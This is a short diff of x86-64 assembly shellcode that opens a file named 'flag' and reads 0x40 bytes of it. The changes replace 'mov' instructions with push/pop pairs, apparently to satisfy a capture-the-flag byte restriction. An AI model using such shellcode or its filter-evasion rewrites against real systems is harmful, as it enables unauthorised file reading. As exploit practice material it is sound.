@@ -2,7 +2,8 @@ BITS 64
 global _start
 _start:
     push 0x67616c66
-    mov rdi,rsp
+    push rsp
+    pop rdi
     xor rax,rax
     push rax
     pop rsi
@@ -11,10 +12,12 @@ _start:
     mov al,0x2
     syscall
 
-    mov rdi,rax
+    push rax
+    pop rdi
     push rsi
     pop rax
-    mov rsi,rsp
+    push rsp
+    pop rsi
     mov dl,0x40
     syscall
 
